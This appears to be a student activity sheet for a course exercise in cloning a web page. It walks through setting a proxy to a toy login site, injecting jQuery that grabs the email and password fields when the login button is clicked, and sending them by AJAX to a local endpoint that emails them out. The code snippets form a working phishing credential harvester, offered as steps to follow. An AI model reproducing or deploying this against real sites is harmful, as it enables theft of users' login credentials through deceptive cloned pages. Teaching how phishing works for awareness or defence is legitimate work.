Web Page Cloning
==================




In this activity, you will learn to clone the web page and email the credentials of the user.




<img src= "https://s3.amazonaws.com/media-p.slid.es/uploads/1525749/images/10988801/PCP.gif" width = "520" height = "250">




Follow the given steps to complete this activity:




1. Set the target URL.




* Open the file `proxy-server.py`.




* Open the `https://tnk-m16-toywebsite.onrender.com/` website, use the inspect option to find the ids of the button and input fields. Update the variable with the ids
~~~python
target_url = "https://tnk-m16-toywebsite.onrender.com/"
login_button = ".login-button"
user_name_field = "#email"
password_field = "#password"
~~~




2. Fetch the credential.
* Open the file `index.html`.
* Fetch the credentials when the login button is pressed.
~~~python
function display_html() {
            $("body").append(newHtml);
       
            $("{{login_button}}").click(function(){
               
                var userLoginId = $("{{user_name_field}}").val();
               
                var userPassword = $("{{password_field}}").val();
~~~
3. Email the credentials.
* Call the `getPassword` function to email the password.
~~~python
$.ajax({
                    url: 'http://127.0.0.1:5000/getPassword',
                    data: { id: userLoginId, password: userPassword},
                });
~~~
* Save and run the code to check the output.
